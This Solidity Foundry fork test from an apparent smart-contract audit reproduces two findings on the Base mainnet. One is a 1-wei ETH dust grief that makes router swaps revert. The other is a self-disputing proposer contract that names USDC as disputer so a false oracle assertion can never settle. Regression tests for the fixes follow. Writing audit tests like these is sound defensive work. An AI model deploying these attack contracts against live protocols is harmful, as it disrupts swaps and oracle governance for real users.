// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IndexController} from "../src/IndexController.sol";
import {Valuation, IAggregatorV3} from "../src/Valuation.sol";
import {IM7CapVault} from "../src/interfaces/IM7CapVault.sol";
import {IOptimisticOracleV3} from "../src/interfaces/IOptimisticOracleV3.sol";
import {ISlipstreamRouter} from "../src/interfaces/ISlipstreamRouter.sol";
import {ControllerToken, ControllerFeed, ControllerRegistry} from "./mocks/ControllerMocks.sol";

interface IRouterPayments {
    function unwrapWETH9(uint256 amountMinimum, address recipient) external payable;
    function refundETH() external payable;
}

interface IOOv3Dispute {
    function disputeAssertion(bytes32 assertionId, address disputer) external;
    function cachedOracle() external view returns (address);
    function getAssertion(bytes32 assertionId) external view returns (IOptimisticOracleV3.Assertion memory);
}

/// @dev Calls the router the way M7CapVault.rebalance and USDCGateway do: from a contract without receive().
contract NoReceiveSwapper {
    ISlipstreamRouter immutable router;

    constructor(ISlipstreamRouter router_) {
        router = router_;
    }

    function sell(address tokenIn, address tokenOut, int24 spacing, uint256 amountIn)
        external
        returns (uint256)
    {
        IERC20(tokenIn).approve(address(router), amountIn);
        return router.exactInputSingle(
            ISlipstreamRouter.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                tickSpacing: spacing,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function buy(address tokenIn, address tokenOut, int24 spacing, uint256 amountOut, uint256 maxIn)
        external
        returns (uint256)
    {
        IERC20(tokenIn).approve(address(router), maxIn);
        return router.exactOutputSingle(
            ISlipstreamRouter.ExactOutputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                tickSpacing: spacing,
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: amountOut,
                amountInMaximum: maxIn,
                sqrtPriceLimitX96: 0
            })
        );
    }
}

/// @dev The fix for N-01: like M7CapVault and USDCGateway, accepts the router's ETH refund and nothing else.
contract RouterGatedSwapper is NoReceiveSwapper {
    address private immutable _router;

    constructor(ISlipstreamRouter router_) NoReceiveSwapper(router_) {
        _router = address(router_);
    }

    receive() external payable {
        require(msg.sender == _router, "router only");
    }
}

/// @dev Proposes a false basket and disputes it in the same transaction, naming the USDC contract (which USDC
///      blacklists) as disputer, so no honest party can dispute first and the losing bond can never be paid out.
contract SelfDisputingProposer {
    function attack(IndexController controller, IERC20 usdc, uint32 quarter, uint256[7] calldata ratios)
        external
        returns (bytes32 id)
    {
        IOOv3Dispute oo = IOOv3Dispute(address(controller.oracle()));
        usdc.approve(address(controller), type(uint256).max);
        id = controller.propose(quarter, ratios, "ipfs://deliberately-false", keccak256("bogus observations"));
        usdc.approve(address(oo), oo.getAssertion(id).bond);
        oo.disputeAssertion(id, address(usdc));
    }
}

/// @dev Opt in with BASE_FORK_TEST=true. Ordinary Foundry suffices: no B20 precompile is touched.
///      Uses the live Slipstream router, UMA OOv3/Finder/Store/whitelists and Circle USDC. The only mock is the
///      bridged DVM vote result read by OOv3 at settlement.
contract Audit2ForkTest is Test {
    ISlipstreamRouter constant ROUTER = ISlipstreamRouter(0x698Cb2b6dd822994581fEa6eA4Fc755d1363A92F);
    IOptimisticOracleV3 constant OO = IOptimisticOracleV3(0x2aBf1Bd76655de80eDB3086114315Eec75AF500c);
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address constant WETH = 0x4200000000000000000000000000000000000006;

    function _startFork() private {
        vm.skip(!vm.envOr("BASE_FORK_TEST", false));
        string memory rpc = vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org"));
        uint256 forkBlock = vm.envOr("BASE_FORK_BLOCK", uint256(0));
        if (forkBlock == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, forkBlock);
        assertEq(block.chainid, 8453);
        emit log_named_uint("Base fork block", block.number);
    }

    // N-01 on the deployed router: 1 wei makes every single-hop swap from a no-receive contract revert.
    function testAudit2LiveRouterEthDustBricksNoReceiveCallers() public {
        _startFork();
        if (address(ROUTER).balance != 0) IRouterPayments(address(ROUTER)).refundETH();
        NoReceiveSwapper victim = new NoReceiveSwapper(ROUTER);
        deal(address(USDC), address(victim), 20e6);
        // USDC/WETH at tick spacing 10 on the same factory the vault and gateway are bound to.
        assertGt(victim.sell(address(USDC), WETH, 10, 5e6), 0);

        address griefer = address(0xBAD);
        vm.deal(griefer, 1);
        vm.prank(griefer);
        IRouterPayments(address(ROUTER)).unwrapWETH9{value: 1}(0, griefer);
        assertEq(address(ROUTER).balance, 1);

        vm.expectRevert(bytes("STE"));
        victim.sell(address(USDC), WETH, 10, 5e6);
        vm.expectRevert(bytes("STE"));
        victim.buy(address(USDC), WETH, 10, 1e12, 5e6);

        IRouterPayments(address(ROUTER)).refundETH();
        assertGt(victim.sell(address(USDC), WETH, 10, 5e6), 0);
    }

    // N-01 regression pattern on the deployed router: a router-gated receive() absorbs the dust and swaps succeed.
    function testAudit2LiveRouterDustIsAbsorbedByRouterGatedReceiver() public {
        _startFork();
        if (address(ROUTER).balance != 0) IRouterPayments(address(ROUTER)).refundETH();
        RouterGatedSwapper fixedCaller = new RouterGatedSwapper(ROUTER);
        deal(address(USDC), address(fixedCaller), 20e6);
        address griefer = address(0xBAD);
        vm.deal(griefer, 2);
        vm.prank(griefer);
        IRouterPayments(address(ROUTER)).unwrapWETH9{value: 1}(0, griefer);
        assertGt(fixedCaller.sell(address(USDC), WETH, 10, 5e6), 0);
        vm.prank(griefer);
        IRouterPayments(address(ROUTER)).unwrapWETH9{value: 1}(0, griefer);
        assertGt(fixedCaller.buy(address(USDC), WETH, 10, 1e12, 5e6), 0);
        assertEq(address(fixedCaller).balance, 2);
        assertEq(address(ROUTER).balance, 0);
    }

    // N-02 regression on the deployed UMA OOv3: the self-disputed false proposal still can never settle in UMA,
    // but it no longer blocks the quarter. An honest proposal is accepted without waiting for the DVM.
    function testAudit2UnpayableDisputerNoLongerBlocksQuarter() public {
        _startFork();
        (IndexController controller, uint32 quarter, uint256[7] memory honest, uint256[7] memory bogus) =
            _deploy();
        SelfDisputingProposer attacker = new SelfDisputingProposer();
        deal(address(USDC), address(attacker), 2_000e6);
        bytes32 id = attacker.attack(controller, USDC, quarter, bogus);
        assertEq(IOOv3Dispute(address(OO)).getAssertion(id).disputer, address(USDC));

        address honestProposer = address(0x600D);
        deal(address(USDC), honestProposer, 1_000e6);
        vm.startPrank(honestProposer);
        USDC.approve(address(controller), 1_000e6);
        bytes32 honestId = controller.propose(quarter, honest, "ipfs://honest", keccak256("observations"));
        vm.stopPrank();

        vm.warp(block.timestamp + 5 days);
        _dvmResolves(false); // the DVM correctly rejects the false claim
        vm.expectRevert("Blacklistable: account is blacklisted");
        controller.settle(id);
        (bool settled,) = address(OO).call(abi.encodeWithSignature("settleAssertion(bytes32)", id));
        assertFalse(settled);

        assertTrue(controller.settle(honestId));
        assertEq(controller.acceptedProposal(quarter), honestId);
        assertEq(USDC.balanceOf(honestProposer), 1_000e6); // bond refunded by the live OOv3
        assertEq(controller.currentQuarter(), quarter);
    }

    function testAudit2ControlOrdinaryDisputerSettlesAndReopensQuarter() public {
        _startFork();
        (IndexController controller, uint32 quarter, uint256[7] memory honest, uint256[7] memory bogus) =
            _deploy();
        address proposer = address(0xBAD);
        address disputer = address(0xD15);
        deal(address(USDC), proposer, 1_000e6);
        deal(address(USDC), disputer, 1_000e6);
        vm.startPrank(proposer);
        USDC.approve(address(controller), 1_000e6);
        bytes32 id = controller.propose(quarter, bogus, "ipfs://false", keccak256("bogus observations"));
        vm.stopPrank();
        vm.startPrank(disputer);
        USDC.approve(address(OO), 1_000e6);
        IOOv3Dispute(address(OO)).disputeAssertion(id, disputer);
        vm.stopPrank();

        vm.warp(block.timestamp + 5 days);
        _dvmResolves(false);
        assertFalse(controller.settle(id));
        assertEq(USDC.balanceOf(disputer), 1_500e6); // both bonds less the 50% burned fraction of one

        address honestProposer = address(0x600D);
        deal(address(USDC), honestProposer, 1_000e6);
        vm.startPrank(honestProposer);
        USDC.approve(address(controller), 1_000e6);
        assertTrue(
            controller.propose(quarter, honest, "ipfs://honest", keccak256("observations")) != bytes32(0)
        );
        vm.stopPrank();
    }

    function _deploy()
        private
        returns (
            IndexController controller,
            uint32 quarter,
            uint256[7] memory honest,
            uint256[7] memory bogus
        )
    {
        address[8] memory assets;
        IAggregatorV3[8] memory feeds;
        for (uint256 i; i < 7; ++i) {
            assets[i] = address(new ControllerToken(8));
            feeds[i] = new ControllerFeed(8, 100e8);
            honest[i] = uint256(1e18) / 7;
            bogus[i] = 1;
        }
        honest[6] += uint256(1e18) % 7;
        bogus[0] = 1e18 - 6;
        assets[7] = address(USDC);
        feeds[7] = new ControllerFeed(8, 1e8);
        Valuation valuation =
            new Valuation(assets, feeds, new ControllerFeed(0, 0), new ControllerRegistry(), 1 hours);
        controller = new IndexController(
            IM7CapVault(address(0xdead)),
            OO,
            USDC,
            1_000e6,
            keccak256("methodology"),
            "ipfs://methodology",
            valuation
        );
        // Move to one hour after the next calendar-quarter boundary so the whole scenario stays in one quarter.
        uint32 now_ = controller.currentQuarter();
        uint256 day = block.timestamp / 1 days + 1;
        while (controller.quarterAt(day * 1 days) == now_) ++day;
        vm.warp(day * 1 days + 1 hours);
        quarter = controller.currentQuarter();
    }

    function _dvmResolves(bool result) private {
        vm.mockCall(
            IOOv3Dispute(address(OO)).cachedOracle(),
            abi.encodeWithSelector(bytes4(keccak256("getPrice(bytes32,uint256,bytes)"))),
            abi.encode(result ? int256(1e18) : int256(0))
        );
    }

    receive() external payable {}
}
